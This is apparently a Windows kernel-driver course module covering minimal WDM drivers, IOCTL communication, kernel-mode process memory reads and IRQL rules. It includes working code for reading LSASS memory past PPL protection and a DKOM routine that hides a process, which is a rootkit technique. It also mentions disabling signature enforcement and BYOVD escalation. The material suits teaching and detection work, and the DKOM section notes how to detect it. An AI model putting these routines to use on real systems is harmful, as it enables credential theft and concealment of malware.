# Module 18 — Kernel Driver Development

## Prerequisites

- Complete Modules 04, 05, 06 (Windows internals, processes, memory)
- Install Windows Driver Kit (WDK) — https://learn.microsoft.com/en-us/windows-hardware/drivers/download-the-wdk
- Set up a Windows VM for testing (kernel bugs = BSOD = can't debug on main machine)
- Enable kernel debugging: `bcdedit /debug on` + `bcdedit /dbgsettings net ...`
- Disable Driver Signature Enforcement for test: `bcdedit /set testsigning on`

---

## 1. The Ring Model

```
Ring 3 (User mode):   Your applications, ntdll.dll, Win32 APIs
                       → limited access, faulting is safe (process dies, not OS)

Ring 0 (Kernel mode): ntoskrnl.exe, hardware drivers, EDR kernel components
                       → full hardware access, bug = BSOD (whole machine crashes)
                       → your code runs at the same privilege as the OS kernel
```

A kernel driver is a `.sys` file loaded by the Windows Driver Model (WDM) or
Windows Driver Framework (WDF). It runs in ring 0.

**Why ring 0 matters for security:**
- Can read/write ANY process's memory (no security checks stop you)
- Can hide processes, files, network connections from user-mode tools
- Can intercept any system call before any user-mode hook sees it
- EDR kernel components run here too — this is the ground truth layer
- Can load a BYOVD (Bring Your Own Vulnerable Driver) to escalate privileges

---

## 2. Minimal WDM Driver

A WDM driver is a DLL-like `.sys` file with a `DriverEntry` function instead of `DllMain`.

```cpp
#include <ntddk.h>

// Called when driver unloads (via sc stop or device removal)
VOID DriverUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    DbgPrint("[MyDriver] Unloaded\n");
}

// Entry point — called by kernel when driver is loaded
NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);

    DbgPrint("[MyDriver] Loaded!\n");

    // Set unload routine (without this, sc stop won't work)
    DriverObject->DriverUnload = DriverUnload;

    return STATUS_SUCCESS;
}
```

**Build (Visual Studio + WDK):**
```
New Project → Kernel Mode Driver (KMDF or WDM)
Or from CLI with MSBuild after setting up WDK environment
```

**Load and test:**
```cmd
sc create MyDriver type= kernel binPath= C:\path\to\MyDriver.sys
sc start MyDriver
DebugView.exe (Sysinternals) → shows DbgPrint output
sc stop MyDriver
sc delete MyDriver
```

---

## 3. Device I/O Control (IOCTL) — User ↔ Kernel Communication

The standard way user-mode code talks to a kernel driver is through
a device object + IOCTL codes.

```cpp
// Kernel side — in DriverEntry:

// 1. Create a device object
UNICODE_STRING devName  = RTL_CONSTANT_STRING(L"\\Device\\MyDriver");
UNICODE_STRING dosName  = RTL_CONSTANT_STRING(L"\\DosDevices\\MyDriver");

PDEVICE_OBJECT devObj = nullptr;
IoCreateDevice(DriverObject, 0, &devName,
               FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &devObj);

// 2. Create a symbolic link so user-mode can open \\.\MyDriver
IoCreateSymbolicLink(&dosName, &devName);

// 3. Register IRP dispatch routines
DriverObject->MajorFunction[IRP_MJ_CREATE]         = DispatchCreateClose;
DriverObject->MajorFunction[IRP_MJ_CLOSE]          = DispatchCreateClose;
DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DispatchIoControl;

// Define IOCTL code (use CTL_CODE macro)
#define IOCTL_MYDRIVER_HELLO CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)

// IOCTL handler
NTSTATUS DispatchIoControl(PDEVICE_OBJECT DevObject, PIRP Irp) {
    UNREFERENCED_PARAMETER(DevObject);
    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG code = stack->Parameters.DeviceIoControl.IoControlCode;

    if (code == IOCTL_MYDRIVER_HELLO) {
        char* outBuf = (char*)Irp->AssociatedIrp.SystemBuffer;
        ULONG outLen = stack->Parameters.DeviceIoControl.OutputBufferLength;
        RtlCopyMemory(outBuf, "Hello from kernel!", min(outLen, 19u));
        Irp->IoStatus.Information = 19;
        Irp->IoStatus.Status = STATUS_SUCCESS;
    }

    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}
```

```cpp
// User-mode side — talk to the driver
HANDLE h = CreateFileA("\\\\.\\MyDriver", GENERIC_READ | GENERIC_WRITE,
                        0, nullptr, OPEN_EXISTING, 0, nullptr);
char response[64] = {};
DWORD returned = 0;
DeviceIoControl(h, IOCTL_MYDRIVER_HELLO, nullptr, 0,
                response, sizeof(response), &returned, nullptr);
printf("Driver says: %s\n", response);
CloseHandle(h);
```

---

## 4. Reading Arbitrary Process Memory from Kernel

From kernel mode, you can read any process's memory without permission checks.

```cpp
// Kernel: read N bytes from a user-mode process at address srcAddr
NTSTATUS KernelReadProcessMemory(HANDLE pid, PVOID srcAddr, PVOID dst, SIZE_T size) {
    PEPROCESS process = nullptr;
    NTSTATUS status = PsLookupProcessByProcessId(pid, &process);
    if (!NT_SUCCESS(status)) return status;

    SIZE_T copied = 0;
    status = MmCopyVirtualMemory(
        process,              // source process
        srcAddr,              // virtual address in that process
        PsGetCurrentProcess(), // dest process (our driver's process)
        dst,                  // our buffer
        size,
        KernelMode,
        &copied
    );

    ObDereferenceObject(process);
    return status;
}
```

**Applications:**
- Read LSASS memory from kernel (bypasses PPL protection)
- Read any process's private memory for forensics
- Memory scanner: scan all processes for a byte pattern

---

## 5. DKOM — Direct Kernel Object Manipulation

Hide a process by removing it from the ActiveProcessLinks doubly-linked list.

```cpp
// The EPROCESS structure (undocumented, offsets vary by Windows version):
// Offset 0x448 (Win10 21H2): ActiveProcessLinks (LIST_ENTRY)
// Offset 0x440: UniqueProcessId (PID)

NTSTATUS hideProcess(HANDLE pid) {
    PEPROCESS target = nullptr;
    NTSTATUS status = PsLookupProcessByProcessId(pid, &target);
    if (!NT_SUCCESS(status)) return status;

    // Get the LIST_ENTRY for this process
    // Offset 0x448 for Win10 21H2 — use a version-aware lookup in production
    PLIST_ENTRY entry = (PLIST_ENTRY)((PBYTE)target + 0x448);

    // Unlink it: previous->Flink = entry->Flink, next->Blink = entry->Blink
    entry->Blink->Flink = entry->Flink;
    entry->Flink->Blink = entry->Blink;

    // Point to itself (prevent crash on unload)
    entry->Flink = entry;
    entry->Blink = entry;

    ObDereferenceObject(target);
    return STATUS_SUCCESS;
}
```

**Detection:** even after DKOM removal, the process still shows up in:
- ETW kernel events (can't hide from ETW from user-mode)
- Handle table enumeration (NtQuerySystemInformation SystemHandleInformation)
- Memory forensics tools that walk the VAD tree directly

---

## 6. Important Kernel Rules

```
1. IRQL (Interrupt Request Level):
   Most of your code runs at IRQL PASSIVE_LEVEL (0) — can do anything.
   At DISPATCH_LEVEL (2): can't access pageable memory (use NonPagedPool only).
   At DIRQL: almost nothing is safe.

2. Memory pools:
   NonPagedPool  — always in physical memory, safe at any IRQL, limited size
   PagedPool     — can be swapped out, only safe at PASSIVE/APC level

3. Never:
   - Call user-mode functions from kernel
   - Sleep for long periods at high IRQL
   - Access user memory without __try/__except (it can fault)
   - Forget to call ObDereferenceObject after PsLookupProcess* calls

4. Debugging:
   DbgPrint + DebugView for quick output
   WinDbg kernel debug (two-machine or VM serial/network) for real debugging
   .bugcheck analysis in WinDbg after BSOD: !analyze -v
```

---

## Exercises

- `ex01_minimal_driver.c` — DriverEntry + DriverUnload, loads and prints to DebugView
- `ex02_ioctl_channel.c` — device object + IOCTL, user-mode talks to kernel
- `ex03_read_process_memory.c` — kernel reads from a target process, returns via IOCTL
- `ex04_process_list.c` — kernel enumerates all processes via PsGetNextProcess
